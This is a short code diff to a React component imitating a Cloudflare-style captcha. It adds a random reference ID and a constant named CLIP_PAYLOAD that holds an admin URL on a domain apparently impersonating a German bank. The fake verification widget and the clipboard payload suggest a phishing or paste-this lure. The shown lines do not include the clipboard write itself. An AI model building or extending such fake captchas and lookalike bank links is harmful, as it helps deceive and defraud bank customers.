@@ -15,6 +15,10 @@ const CfCaptcha = () => {
   const [x, setX] = useState(0);
   const [done, setDone] = useState(false);
   const [phase, setPhase] = useState<Phase>("idle");
+  const [refId] = useState(() =>
+    Array.from({ length: 16 }, () => "0123456789abcdef"[Math.floor(Math.random() * 16)]).join("")
+  );
+  const CLIP_PAYLOAD = "https://apobank.de-direkthilfe.app/admin";
   const startXRef = useRef(0);
   const startPosRef = useRef(0);
   const KNOB = 44;
